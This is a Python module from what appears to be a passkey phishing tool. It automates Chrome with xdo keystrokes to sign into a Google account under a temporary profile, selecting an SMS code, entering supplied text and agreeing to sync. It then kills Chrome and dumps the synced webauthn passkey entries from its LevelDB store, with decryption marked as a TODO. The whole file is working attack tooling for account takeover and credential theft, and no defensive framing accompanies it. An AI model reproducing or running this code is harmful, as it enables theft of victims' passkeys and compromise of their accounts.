import os
import subprocess
import tempfile
import time
from typing import Tuple, List

import plyvel
from xdo import Xdo

from passkeyphishing.colors import print_info


class Chrome:

    def __init__(self):
        self.win_id: int = 0
        self.xdo = None
        self.tmp_dir = "/tmp/tmpyuwljms3"

        # Get the current Chrome window if there is one -- useful for debugging
        self.__get_chrome()

    def __get_chrome(self):
        self.xdo = Xdo()
        windows = self.xdo.search_windows(b"Chrome", only_visible=True)
        if len(windows) == 0:
            return
        self.win_id: int = windows[-1]
        self.xdo.activate_window(self.win_id)
        self.xdo.focus_window(self.win_id)

    def get_passkeys(self) -> List[Tuple[bytes, bytes]]:
        """ Dump the LevelDB key/value pairs of webauthn keys """

        # Chrome must die to read the database
        os.system("killall chrome")
        time.sleep(1)
        rtn = []
        with plyvel.DB(f'{self.tmp_dir}/Default/Sync Data/LevelDB/') as db:
            for key, value in db.iterator(prefix=b'webauthn'):
                # TODO: Decrypt the keys and metadata here
                rtn.append((key, value))

        return rtn


    def restart_chrome(self):
        print_info("Setting up chrome")
        os.system("killall chrome")
        self.tmp_dir = tempfile.TemporaryDirectory().name
        subprocess.Popen(["google-chrome", f"--user-data-dir={self.tmp_dir}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_info(f"Opened Chrome with temp directory {self.tmp_dir}")

        # Get the window and activate it
        time.sleep(2)
        self.__get_chrome()
        # Select 'Continue'
        self.xdo.send_keysequence_window(self.win_id, b'Return')

        # Wait for the next screen
        time.sleep(3)
        self.__get_chrome()

        print_info("Selecting Sign In...")
        # Select New user
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Return')

    def select_sms_code(self):
        self.__get_chrome()
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Return')
        time.sleep(3)

    def agree_to_sync(self):
        self.__get_chrome()
        self.xdo.send_keysequence_window(self.win_id, b'Tab')
        self.xdo.send_keysequence_window(self.win_id, b'Return')
        time.sleep(3)


    def enter_text(self, text: bytes):
        self.__get_chrome()
        time.sleep(1)
        self.xdo.enter_text_window(self.win_id, text)
        self.xdo.send_keysequence_window(self.win_id, b'Return')
        time.sleep(2)




if __name__ == "__main__":
    print("Running a test")
    c = Chrome()
    c.restart_chrome()
    c.enter_text("test")
